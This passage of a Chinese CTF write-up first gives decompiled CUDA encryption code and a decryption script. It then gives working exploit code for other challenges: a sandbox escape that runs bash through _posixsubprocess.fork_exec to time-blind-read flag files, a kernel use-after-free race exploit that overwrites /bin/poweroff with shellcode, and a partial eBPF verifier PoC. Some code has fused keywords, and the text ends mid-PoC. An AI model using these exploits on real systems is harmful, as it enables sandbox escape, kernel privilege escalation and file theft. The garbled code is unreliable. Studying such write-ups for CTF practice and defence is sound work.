    rs58 = rs34 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
    uint8_t rs36 = T[rs58 & 0xFF]
    uint16_t rs37 = rs36 >> 4;
    uint16_t rs38 = rs36 << 4;
    uint16_t rs39 = rs37 | rs38;
    rs58 = rs39 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
    uint8_t rs41 = T[rs58 & 0xFF]
    uint16_t rs42 = rs36 >> 4;
    uint16_t rs43 = rs36 << 4;
    uint16_t rs44 = rs37 | rs38;
    rs58 = rs44 ^ (uint16_t)i;
}

uint32_t r257 = -239350328;
uint32_t r256 = 387276957;
uint32_t r255 = 2027808484;
uint32_t r254 = -626627285;
uint32_t r253 = 1013904242;
uint32_t r252 = -1640531527

k = {-1556008596,-939442524,1013904242,338241895};
uint32_t k0=k[0],k1=k[1],k2=k[2],k3=k[3];

for(int i=0;i<10485760;i+=8)
{
    v0 += (v1<<4+k0)^(v1 + r252)^(v1>>5 + k1)
    v1 += (v0<<4+k2)^(v0 + r252)^(v0>>5 + k3)

    v0 += (v1<<4+k0)^(v1 + r253)^(v1>>5 + k1)
    v1 += (v0<<4+k2)^(v0 + r253)^(v0>>5 + k3)

    v0 += (v1<<4+k0)^(v1 + r254)^(v1>>5 + k1)
    v1 += (v0<<4+k2)^(v0 + r254)^(v0>>5 + k3)

    v0 += (v1<<4+k0)^(v1 + r255)^(v1>>5 + k1)
    v1 += (v0<<4+k2)^(v0 + r255)^(v0>>5 + k3)

    v0 += (v1<<4+ k0)^(v1 + r256)^(v1>>5 + k1)
    v1 += (v0<<4+ k2)^(v0 + r256)^(v0>>5 + k3)

    v0 += (v1<<4+ k0)^(v1 + (r257 - 1013904242))^(v1>>5 + k1)
    v1 += (v0<<4+ k2)^(v0 + (r257 - 1013904242))^(v0>>5 + k3)

    v0 += (v1<<4+ k0)^(v1+ (r257 + 1640531527))^(v1>>5 + k1)
    v1 += (v0<<4+ k2)^(v0+ (r257 + 1640531527))^(v0>>5 + k3)

    v0 += (v1<<4+ k0)^(v1+ r257)^(v1>>5+ k1)
    v1 += (v0<<4+ k2)^(v0+ r257)^(v0>>5+ k3)
    
    r257 -= 239350328;
    r256 -= 239350328;
    r255 -= 239350328;
    r254 -= 239350328;
    r253 -= 239350328;
    r252 -= 239350328;
    
}

还是有部分内容解读欠妥，直接上grok反编译一下，然后进行修正，主要加密顺序可以分为5个部分了，先是每个线程从全局内存读取数据 data[idx]，也就是input，对数据进行初步的异或和位操作，然后进行 5 个独立的循环（每个循环 10485760 次），使用常量数组 T 进行 S-box 变换，对变换结果进行位移（高低 4 位交换）并与循环计数异或，这部分可以直接求逆盒之后直接化简掉，然后再是相邻数据异或阶段，从第二个元素开始，计算 temp = data[i - 1] ^ key ^ data[i]。将结果存储回 data[i - 1]，再是数据交换位置操作，然后再是类似tea的操作，最后还有一个简单的异或过程。不过总体来说反编译的几乎是相当不错了，第一步的key从ida里面分析可以得到是172传入的

#include <stdio.h>
#include <stdint.h>

#define BLOCK_SIZE 256  // 假设块大小为 256，具体值需根据上下文确定

// 外部函数声明
extern"C"int vprintf(const char *format, ...);

// 常量数组 T 和 RT（RT 在代码中未使用，可忽略）
constuint8_t T[256] = {
    99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118,
    202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192,
    183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21,
    4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117,
    9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132,
    83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207,
    208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168,
    81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210,
    205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115,
    96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219,
    224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121,
    231, 200, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8,
    186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138,
    112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158,
    225, 248, 152, 17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223,
    140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22
};

// 全局字符串
constchar str[] = "gift1:n";
constchar str1[] = "%02x ";
constchar str2[] = "n";
constchar str3[] = "gift2:n";
constchar str4[] = "gift3:n";
constchar str5[] = "gift4:n";
constchar str6[] = "gift5:n";

__global__ void encrypt_kernel(uchar *data, uchar key) {
    uint32_t tid = threadIdx.x;  // 线程 ID
    uint32_t bid = blockIdx.x;   // 块 ID
    uint32_t idx = bid * blockDim.x + tid;  // 全局线程索引
    
    // 检查是否在块内执行
    if (tid < blockDim.x) {
        uchar val = data[idx];
        uint16_t temp = (uint16_t)idx * 73 + key;
        val ^= temp;
        val = (val & 0xF0) | (val << 4);
        
        // 多次应用 S-box 变换（共 5 个 10485760 次的循环）
        for (int i = 0; i < 10485760; i++) {
            uint8_t index = val & 0xFF;
            uint8_t s_val = T[index];
            s_val = (s_val >> 4) | (s_val << 4);
            val = s_val ^ (uint16_t)i;
        }
        for (int i = 0; i < 10485760; i++) {
            uint8_t index = val & 0xFF;
            uint8_t s_val = T[index];
            s_val = (s_val >> 4) | (s_val << 4);
            val = s_val ^ (uint16_t)i;
        }
        for (int i = 0; i < 10485760; i++) {
            uint8_t index = val & 0xFF;
            uint8_t s_val = T[index];
            s_val = (s_val >> 4) | (s_val << 4);
            val = s_val ^ (uint16_t)i;
        }
        for (int i = 0; i < 10485760; i++) {
            uint8_t index = val & 0xFF;
            uint8_t s_val = T[index];
            s_val = (s_val >> 4) | (s_val << 4);
            val = s_val ^ (uint16_t)i;
        }
        for (int i = 0; i < 10485760; i++) {
            uint8_t index = val & 0xFF;
            uint8_t s_val = T[index];
            s_val = (s_val >> 4) | (s_val << 4);
            val = s_val ^ (uint16_t)i;
        }
        
        data[idx] = val;
    }
    
    __syncthreads();
    
    // 打印 gift1 阶段的结果（仅由 idx == 0 的线程执行）
    if (idx == 0) {
        printf("gift1:n");
        for (int i = 0; i < blockDim.x; i++) {
            printf("%02x ", data[i]);
        }
        printf("n");
    }
    
    __syncthreads();
    
    // 线程 0 处理相邻数据的异或操作
    if (tid == 0) {
        for (int i = 1; i < blockDim.x; i++) {
            uchar temp = data[i - 1] ^ key;
            temp ^= data[i];
            data[i - 1] = temp;
        }
    }
    
    __syncthreads();
    
    // 打印 gift2 阶段的结果（仅由 idx == 0 的线程执行）
    if (idx == 0) {
        printf("gift2:n");
        for (int i = 0; i < blockDim.x; i++) {
            printf("%02x ", data[i]);
        }
        printf("n");
    }
    
    __syncthreads();
    
    // 奇数线程 ID 交换相邻数据
    if (tid % 2 == 1 && tid < blockDim.x - 1) {
        uchar temp = data[idx];
        data[idx] = data[idx + 1];
        data[idx + 1] = temp;
    }
    
    __syncthreads();
    
    // 打印 gift3 阶段的结果（仅由 idx == 0 的线程执行）
    if (idx == 0) {
        printf("gift3:n");
        for (int i = 0; i < blockDim.x; i++) {
            printf("%02x ", data[i]);
        }
        printf("n");
    }
    
    __syncthreads();
    
    // 奇数线程 ID 再次交换相邻数据（需确保线程 ID >= 1）
    if (tid >= 1 && tid % 2 == 1 && tid < blockDim.x - 1) {
        uchar temp = data[idx];
        data[idx] = data[idx + 1];
        data[idx + 1] = temp;
    }
    
    __syncthreads();
    
    // 打印 gift4 阶段的结果（仅由 idx == 0 的线程执行）
    if (idx == 0) {
        printf("gift4:n");
        for (int i = 0; i < blockDim.x; i++) {
            printf("%02x ", data[i]);
        }
        printf("n");
    }
    
    __syncthreads();
    
    // 每 8 个线程执行复杂的位操作（可能是某种加密算法的一部分）
    if (tid % 8 == 0 && tid < blockDim.x) {
        uint32_t val1 = *(uint32_t*)(&data[idx]);
        uint32_t val2 = *(uint32_t*)(&data[idx + 4]);
        uint32_t constants[6] = {
            -1640531527, 1013904242, -626627285, 2027808484, 387276957, -239350328
        };
        uint32_t temp_val1 = val1, temp_val2 = val2;
        
        for (int i = 0; i < 10485760; i += 8) {
            // 复杂的位操作和异或运算，涉及常量和移位
            // 由于过于复杂，此处仅示意，具体实现需根据 PTX 代码进一步分析
            temp_val1 = /* 复杂的位操作 */;
            temp_val2 = /* 复杂的位操作 */;
            // 更新常量
            for (int j = 0; j < 6; j++) {
                constants[j] -= 239350328;
            }
        }
        
        *(uint32_t*)(&data[idx]) = temp_val1;
        *(uint32_t*)(&data[idx + 4]) = temp_val2;
    }
    
    __syncthreads();
    
    // 打印 gift5 阶段的结果（仅由 idx == 0 的线程执行）
    if (idx == 0) {
        printf("gift5:n");
        for (int i = 0; i < blockDim.x; i++) {
            printf("%02x ", data[i]);
        }
        printf("n");
    }
    
    __syncthreads();
    
    // 最终操作：每个线程对其数据进行异或
    if (tid < blockDim.x) {
        data[idx] ^= (uchar)idx;
    }
}

然后可以编写对应的解密EXP如下：

import struct

RT = [
    0x3e, 0xa8, 0xb8, 0x66, 0xcc, 0x24, 0xde, 0x3b, 0x72, 0xdf, 0xf1, 0xd3, 0x9e, 0xbb, 0xea, 0x10, 0x59, 0x83, 0x1e,0xe6, 0x58, 0x26, 0xd8, 0xa3, 0xb5, 0x44, 0x42, 0xf6, 0xd2, 0xe3, 0x7c, 0x6e, 0x91, 0x40, 0x22, 0x9d, 0x4e, 0x9f,0x1b, 0xc8, 0x7b, 0x17, 0xf3, 0x03, 0xf0, 0xa4, 0xb3, 0xad, 0x0f, 0x96, 0xae, 0xef, 0x2e, 0x52, 0x16, 0x47, 0x13,0x20, 0xe5, 0x79, 0xdc, 0x92, 0x3a, 0xfd, 0xfc, 0x4b, 0x50, 0x2f, 0xb9, 0xcf, 0x15, 0x98, 0xf8, 0xba, 0x01, 0x7d,0x6f, 0x8f, 0x39, 0xd0, 0x7f, 0x99, 0xfe, 0x77, 0x81, 0x48, 0xd9, 0x11, 0xa0, 0x89, 0xe7, 0xdd, 0x04, 0x43, 0xa2,0x4d, 0x08, 0x5f, 0x71, 0x09, 0xd1, 0x02, 0xf4, 0xab, 0x8e, 0xa5, 0x07, 0x3f, 0x6c, 0x4f, 0x27, 0xe0, 0x1f, 0xbd,0x23, 0xc4, 0x1c, 0x0e, 0x80, 0x65, 0x74, 0xeb, 0x54, 0x64, 0xfb, 0xd4, 0x2d, 0x56, 0xc0, 0xc6, 0xee, 0xec, 0x55,0x87, 0x9c, 0x5a, 0xb4, 0xb7, 0x67, 0x90, 0x82, 0x6a, 0xa7, 0x29, 0x06, 0xe8, 0x88, 0x2a, 0x94, 0x35, 0x6b, 0x0d,0x0c, 0xc9, 0xda, 0x2c, 0x5c, 0xc3, 0x21, 0xbc, 0x41, 0x25, 0x97, 0xbe, 0x62, 0x73, 0x8c, 0xd6, 0x05, 0xbf, 0xaa,0xe9, 0xf7, 0x93, 0x3c, 0x78, 0xc2, 0x4a, 0xb2, 0x12, 0xa1, 0x75, 0xf2, 0xe1, 0xd5, 0x30, 0x3d, 0x9b, 0x53, 0xce,0x60, 0x8b, 0x8d, 0xa9, 0x36, 0x9a, 0x19, 0xb0, 0xff, 0xb6, 0xf5, 0x57, 0xb1, 0xc7, 0x38, 0x61, 0x85, 0xe2, 0xca,0x34, 0x33, 0xdb, 0x32, 0x7e, 0x2b, 0x7a, 0xfa, 0x69, 0xed, 0x1a, 0xcd, 0x70, 0x63, 0x86, 0x84, 0x0b, 0x00, 0x5e,0x76, 0xaf, 0x45, 0x46, 0xcb, 0x68, 0x49, 0x14, 0x5b, 0xf9, 0xe4, 0x4c, 0xc1, 0x95, 0x31, 0xd7, 0x51, 0x0a, 0xc5,0x28, 0x37, 0x5d, 0xac, 0x18, 0x1d, 0x8a, 0x6d, 0xa6
]
def cuda_decrypt(enc):
    enc = bytearray(enc)

    for i in range(256):
        enc[i] ^= i

    for i in range(0, 256, 8):
        t0 = struct.unpack('<I', enc[i:i+4])[0]
        t1 = struct.unpack('<I', enc[i+4:i+8])[0]

        temp = [-239350328, 387276957, 2027808484, -626627285, 1013904242, -1640531527]
        key = [0] * 6
        for j in range(6):
            key[j] = temp[j] + (-239350328 * 0x140000)

        for j in range(0, 10485760, 8):
            for k in range(6):
                key[k] = (key[k] + 239350328) & 0xFFFFFFFF

            t1 = (t1 - (((t0 << 4) + 1013904242) ^ ((t0 >> 5) + 338241895) ^ (t0 + key[0]))) & 0xFFFFFFFF
            t0 = (t0 - (((t1 << 4) + -1556008596) ^ ((t1 >> 5) + -939442524) ^ (key[0] + t1))) & 0xFFFFFFFF
            
            t1 = (t1 - (((t0 << 4) + 1013904242) ^ ((t0 >> 5) + 338241895) ^ (t0 + key[0] + 1640531527))) & 0xFFFFFFFF
            t0 = (t0 - (((t1 << 4) + -1556008596) ^ ((t1 >> 5) + -939442524) ^ (key[0] + 1640531527 + t1))) & 0xFFFFFFFF
            
            t1 = (t1 - (((t0 << 4) + 1013904242) ^ ((t0 >> 5) + 338241895) ^ (t0 + key[0] - 1013904242))) & 0xFFFFFFFF
            t0 = (t0 - (((t1 << 4) + -1556008596) ^ ((t1 >> 5) + -939442524) ^ (key[0] - 1013904242 + t1))) & 0xFFFFFFFF
            
            t1 = (t1 - (((t0 << 4) + 1013904242) ^ ((t0 >> 5) + 338241895) ^ (t0 + key[1]))) & 0xFFFFFFFF
            t0 = (t0 - (((t1 << 4) + -1556008596) ^ ((t1 >> 5) + -939442524) ^ (key[1] + t1))) & 0xFFFFFFFF
            
            t1 = (t1 - (((t0 << 4) + 1013904242) ^ ((t0 >> 5) + 338241895) ^ (t0 + key[2]))) & 0xFFFFFFFF
            t0 = (t0 - (((t1 << 4) + -1556008596) ^ ((t1 >> 5) + -939442524) ^ (key[2] + t1))) & 0xFFFFFFFF
            
            t1 = (t1 - (((t0 << 4) + 1013904242) ^ ((t0 >> 5) + 338241895) ^ (t0 + key[3]))) & 0xFFFFFFFF
            t0 = (t0 - (((t1 << 4) + -1556008596) ^ ((t1 >> 5) + -939442524) ^ (key[3] + t1))) & 0xFFFFFFFF
            
            t1 = (t1 - (((t0 << 4) + 1013904242) ^ ((t0 >> 5) + 338241895) ^ (t0 + key[4]))) & 0xFFFFFFFF
            t0 = (t0 - (((t1 << 4) + -1556008596) ^ ((t1 >> 5) + -939442524) ^ (key[4] + t1))) & 0xFFFFFFFF
            
            t1 = (t1 - (((t0 << 4) + 1013904242) ^ ((t0 >> 5) + 338241895) ^ (t0 + key[5]))) & 0xFFFFFFFF
            t0 = (t0 - (((t1 << 4) + -1556008596) ^ ((t1 >> 5) + -939442524) ^ (key[5] + t1))) & 0xFFFFFFFF

        enc[i:i+4] = struct.pack('<I', t0)
        enc[i+4:i+8] = struct.pack('<I', t1)

    for i in range(0, 256, 2):
        data = enc[i]
        enc[i] = enc[(i - 1 + 256) % 256]
        enc[(i - 1 + 256) % 256] = data

    for i in range(0, 256, 2):
        data = enc[i]
        enc[i] = enc[(i + 1 + 256) % 256]
        enc[(i + 1) % 256] = data

    for i in range(255, -1, -1):
        enc[i] ^= 172 ^ enc[(i + 1) % 256]

    for i in range(256):
        data = RT[enc[i]]
        data = ((data >> 4) | (data << 4)) & 0xFF
        data ^= (i * 73 + 172) & 0xFF
        enc[i] = data

    return bytes(enc)

def main():

    with open("flag_enc", "rb") as f:
        content = bytearray(f.read())
    
    size = len(content)
    for i in range(0, size, 255): 
        block = content[i:i+256]
        if len(block) < 256:  
            block += bytearray(256 - len(block))
        decrypted_block = cuda_decrypt(block)
        content[i:i+256] = decrypted_block

    with open("flag", "wb") as f:
        f.write(content)

if __name__ == "__main__":
    main(

文末:

欢迎师傅们加入我们:

星盟安全团队纳新群1:222328705

星盟安全团队纳新群2:346014666

有兴趣的师傅欢迎一起来讨论!

PS:团队纳新简历投递邮箱：

xmcve@qq.com

责任编辑：@Elite


```
import os
import subprocess
import uuid
import json
from flask import Flask, request, jsonify, send_file
from pathlib import Path

app = Flask(__name__)

SUBMISSIONS_PATH = Path("./submissions")
PROBLEMS_PATH = Path("./problems")

SUBMISSIONS_PATH.mkdir(parents=True, exist_ok=True)

CODE_TEMPLATE = """
import sys
import math
import collections
import queue
import heapq
import bisect

def audit_checker(event,args):
    if not event in ["import","time.sleep","builtins.input","builtins.input/result"]:
        raise RuntimeError

sys.addaudithook(audit_checker)
"""

class OJTimeLimitExceed(Exception):
    pass

class OJRuntimeError(Exception):
    pass

@app.route("/")
def index():
    return send_file("static/index.html")

@app.route("/source")
def source():
    return send_file("server.py")

@app.route("/api/problems")
def list_problems():
    problems_dir = PROBLEMS_PATH
    problems = []
    for problem in problems_dir.iterdir():
        problem_config_file = problem / "problem.json"
        ifnot problem_config_file.exists():
            continue

        problem_config = json.load(problem_config_file.open("r"))
        problem = {
            "problem_id": problem.name,
            "name": problem_config["name"],
            "description": problem_config["description"],
        }
        problems.append(problem)

    problems = sorted(problems, key=lambda x: x["problem_id"])

    problems = {"problems": problems}
    return jsonify(problems), 200

@app.route("/api/submit", methods=["POST"])
def submit_code():
    try:
        data = request.get_json()
        code = data.get("code")
        problem_id = data.get("problem_id")

        if code isNoneor problem_id isNone:
            return (
                jsonify({"status": "ER", "message": "Missing 'code' or 'problem_id'"}),
                400,
            )

        problem_id = str(int(problem_id))
        problem_dir = PROBLEMS_PATH / problem_id
        ifnot problem_dir.exists():
            return (
                jsonify(
                    {"status": "ER", "message": f"Problem ID {problem_id} not found!"}
                ),
                404,
            )

        code_filename = SUBMISSIONS_PATH / f"submission_{uuid.uuid4()}.py"
        with open(code_filename, "w") as code_file:
            code = CODE_TEMPLATE + code
            code_file.write(code)

        result = judge(code_filename, problem_dir)

        code_filename.unlink()

        return jsonify(result)

    except Exception as e:
        return jsonify({"status": "ER", "message": str(e)}), 500

def judge(code_filename, problem_dir):
    test_files = sorted(problem_dir.glob("*.input"))
    total_tests = len(test_files)
    passed_tests = 0

    try:
        for test_file in test_files:
            input_file = test_file
            expected_output_file = problem_dir / f"{test_file.stem}.output"

            ifnot expected_output_file.exists():
                continue

            case_passed = run_code(code_filename, input_file, expected_output_file)

            if case_passed:
                passed_tests += 1

        if passed_tests == total_tests:
            return {"status": "AC", "message": f"Accepted"}
        else:
            return {
                "status": "WA",
                "message": f"Wrang Answer: pass({passed_tests}/{total_tests})",
            }
    except OJRuntimeError as e:
        return {"status": "RE", "message": f"Runtime Error: ret={e.args[0]}"}
    except OJTimeLimitExceed:
        return {"status": "TLE", "message": "Time Limit Exceed"}

def run_code(code_filename, input_file, expected_output_file):
    with open(input_file, "r") as infile, open(
        expected_output_file, "r"
    ) as expected_output:
        expected_output_content = expected_output.read().strip()

        process = subprocess.Popen(
            ["python3", code_filename],
            stdin=infile,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        try:
            stdout, stderr = process.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            process.kill()
            raise OJTimeLimitExceed

        if process.returncode != 0:
            raise OJRuntimeError(process.returncode)

        if stdout.strip() == expected_output_content:
            returnTrue
        else:
            returnFalse

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```



```
def audit_checker(event,args):
    if not event in ["import","time.sleep","builtins.input","builtins.input/result"]:
        raise RuntimeError

sys.addaudithook(audit_checker)
```



```
with open(code_filename, "w") as code_file:
            code = CODE_TEMPLATE + code
            code_file.write(code)
……

def judge(code_filename, problem_dir):
……
        if passed_tests == total_tests:
            return {"status": "AC", "message": f"Accepted"}
        else:
            return {
                "status": "WA",
                "message": f"Wrang Answer: pass({passed_tests}/{total_tests})",
            }
……

def run_code(code_filename, input_file, expected_output_file):
……
        process = subprocess.Popen(
            ["python3", code_filename],
            stdin=infile,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
```



```
import requests
from requests.exceptions import Timeout

# 配置常量
TARGET_URL = "url/api/submit"
HEADERS = {"Content-Type": "application/json"}
TIMEOUT_LIMIT = 5
CHAR_SET = "qwertyuiopasdfghjklzxcvbnm1234567890{}-"
SLEEP_DURATION = 10# 用于触发超时的睡眠时间

class FlagBruteforcer:
    def __init__(self):
        self.session = requests.Session()
        self.flag = ""
    
    def _generate_payload(self, char: str) -> str:
        """构造盲注payload"""
        position = len(self.flag) + 1
        return (
            f"if [ $(cat /f* | cut -c {position}) = '{char}' ]; "
            f"then sleep {SLEEP_DURATION}; fi"
        )
    
    def _build_exploit_code(self, payload: str) -> dict:
        """构造包含payload的请求体"""
        return {
            "code": f"""import os
import _posixsubprocess
_posixsubprocess.fork_exec(
    [b"/bin/bash", b"-c", b"{payload}"],
    [b"/bin/bash"],
    True,
    (), None, None, -1, -1, -1, -1, -1, -1, *os.pipe(),
    False, False, False, None, None, None, -1, None, False
)
input_str = input()
a, b = map(int, input_str.split())
print(a - b)""",
            "problem_id": "0"
        }
    
    def _test_character(self, char: str) -> bool:
        """测试单个字符并返回是否触发超时"""
        payload = self._generate_payload(char)
        json_data = self._build_exploit_code(payload)
        
        try:
            response = self.session.post(
                TARGET_URL,
                headers=HEADERS,
                json=json_data,
                timeout=TIMEOUT_LIMIT
            )
            print(f"Response: {response.text}")
            returnFalse
        except Timeout:
            returnTrue
    
    def run(self):
        """主爆破逻辑"""
        whileTrue:
            found = False
            print(f"Current progress: {self.flag}|")
            
            for char in CHAR_SET:
                print(f"Testing: {self.flag}{char}")
                
                if self._test_character(char):
                    self.flag += char
                    found = True
                    print(f"MATCH! Current flag: {self.flag}")
                    break
            
            ifnot found:
                print(f"flag: {self.flag}")
                break

if __name__ == "__main__":
    bruteforcer = FlagBruteforcer()
    bruteforcer.run()
```



```
#include "Kernel.h"

#define ALIMEM_ALLOC 0x1337
#define ALIMEM_FREE 0x1338
#define ALIMEM_WRITE 0x1339
#define ALIMEM_READ 0x133a

struct alimem_write {
    int idx;
    unsignedint offset;
    char * data;
    size_t size;
};

struct alimem_read {
    int idx;
    unsignedint offset;
    char * data;
    size_t size;
};

char buf[0x1000];
long* ibuf = (long*)buf, log = 0;

void kalloc(int fd) {
    if (log) {
        printf("kallocn");
    }
    ioctl(fd, ALIMEM_ALLOC, 0);
}

void kfree(int fd, int idx) {
    if (log) {
        printf("kfree %dn", idx);
    }
    ioctl(fd, ALIMEM_FREE, &idx);
}

void kwrite(int fd, int idx, int off, size_t size, char *buf) {
    struct alimem_write aw = {
        .idx = idx,
        .offset = off,
        .data = buf,
        .size = size,
    };
    ioctl(fd, ALIMEM_WRITE, &aw);
}

void kread(int fd, int idx, int off, size_t size, char* buf) {
    struct alimem_read ar = {
    .idx = idx,
    .offset = off,
    .data = buf,
    .size = size
    };
    ioctl(fd, ALIMEM_READ, &ar);
}

long* addr[64] = { 0 }, stop = 0, t = 0, tt = 0;
int fds[0x200];

void kuaf_1(int fd) {
    int i = 0;
    while (!stop) {
        t = 0;
        tt = 0;
        kalloc(fd);
        ibuf[0] = 0x100;
        kwrite(fd, 0, 0, 0x100, buf);
        t = 1;
        kfree(fd, 0);
        if ((long)addr[0] <= 0) continue;
        ibuf[0] = 0x200;
        kalloc(fd);
        kwrite(fd, 0, 0, 0x100, buf);
        if (addr[0][0] == 0x200) {
            stop = 1;
            tt = 1;
            break;
        }
        kfree(fd, 0);
        tt = 1;
    }
}

void kuaf_2(int fd) {
    int i = 0;
    putchar('n');
    while (1) {
        while (!t) {};
        addr[0] = (long*)mmap((void*)NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
        if ((long)addr[0] <= 0) {
            continue;
        }
        printf("r%d", i);
        i++;
        while (!tt) {};
        if (stop) {
            break;
        }
        //munmap(addr[0], 0x1000);
        addr[0] = 0;
    }
    putchar('n');
}

int main() {
    int fd = open("/dev/alimem",O_RDWR);
    pthread_t pt1, pt2;
    if (pthread_create(&pt1, 0, (void* (*)(void*))kuaf_1, (void*)fd) != 0) {
        perror("pthread 1");
        exit(0);
    }
    if (pthread_create(&pt2, 0, (void* (*)(void*))kuaf_2, (void*)fd)) {
        perror("pthread 2");
        exit(0);
    }
    pthread_join(pt1, 0);
    pthread_join(pt2, 0);

    printf("[+] Stage 1 finished.n");

    ibuf[0] = 0x300;
    kwrite(fd, 0, 0, 0x100, buf);
    if (addr[0][0] == 0x300) {
        kfree(fd, 0);
        if (addr[0][0] == 0x300) {
            printf("[-] UAF failed.n");
            exit(0);
        }
        printf("[+] UAF success.n");
    }
    else {
        printf("[-] UAF failed.n");
        exit(0);
    }

    binary_dump((char*)addr[0], 0x100, 0);
    
    for (int i = 0; i < 0x200; i++) {
        fds[i] = open("/bin/poweroff", O_RDONLY);
    }
    if (addr[0][0] == 0x300) {
        printf("[-] Spray file failed.n");
        exit(0);
    }
    printf("[+] Spray file success.n");
    binary_dump((char*)addr[0], 0x100, 0);
    addr[0][0x10 / 8] = 0x004f801f00000000;
    addr[0][0x48 / 8] = 0x8002;
    binary_dump((char*)addr[0], 0x100, 0);
    for (int i = 0; i < 0x200; i++) {
        unsignedchar orw_elfcode[] = { 0x7f,0x45,0x4c,0x46,0x2,0x1,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x2,0x0,0x3e,0x0,0x1,0x0,0x0,0x0,0x78,0x0,0x40,0x0,0x0,0x0,0x0,0x0,0x40,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x40,0x0,0x38,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x5,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x40,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x40,0x0,0x0,0x0,0x0,0x0,0xb7,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0xb7,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x10,0x0,0x0,0x0,0x0,0x0,0x0,0x48,0xbf,0x2f,0x66,0x6c,0x61,0x67,0x0,0x0,0x0,0x57,0x48,0x89,0xe7,0x48,0x31,0xf6,0x48,0x31,0xd2,0xb8,0x2,0x0,0x0,0x0,0xf,0x5,0x48,0x89,0xc7,0x48,0x89,0xe6,0xba,0x0,0x1,0x0,0x0,0x48,0x31,0xc0,0xf,0x5,0xbf,0x1,0x0,0x0,0x0,0x48,0x89,0xe6,0xba,0x0,0x1,0x0,0x0,0xb8,0x1,0x0,0x0,0x0,0xf,0x5 };
        write(fds[i], orw_elfcode, sizeof(orw_elfcode));
        close(fds[i]);
    }
    return0;
}
```



```
//其中map->value[0] = 0;

struct bpf_insn insns[] = {
        /* save skb_buff. */
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1, 0),
        
        /* map_lookup_elem, 获取只读数据 */
        BPF_LD_MAP_FD(BPF_REG_1, array_fd),
        BPF_ST_MEM(BPF_DW, BPF_REG_10, -8, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10, 0),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_MOV64_IMM(BPF_REG_3, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, -1),
        BPF_EXIT_INSN(),

        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0, 0),

        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),
        
        BPF_EXIT_INSN()
};
```



```
/* POC */

int test_vuln() {
    unsignedint ret = 0;
    int array_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x40, 1, BPF_F_RDONLY_PROG);
    if (array_fd < 0) {
        error_quit("BPF_MAP_TYPE_ARRAY error");
    }

    int key = 0;
    long v[0x40];
    v[0] = 0;
    int error = bpf_update_elem(array_fd, &key, v, 0);
    if (error < 0) {
        error_quit("BPF_UPDATE_ELEM error");
     
     struct bpf_insn insns[] = {
        /* save skb_buff. */
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1, 0),
    
        /* map_lookup_elem */
        BPF_LD_MAP_FD(BPF_REG_1, array_fd),
        BPF_ST_MEM(BPF_DW, BPF_REG_10, -8, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10, 0),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_MOV64_IMM(BPF_REG_3, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
    
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, -1),
        BPF_EXIT_INSN(),
    
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0, 0),
        /* 修改只读map */
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0, 0),
        BPF_MOV64_IMM(BPF_REG_2, 8),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_0, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_aliyunctf_xor),
    
        /* verifier认为BPF_REG_7的值为原先的0，但实际值为2025 */
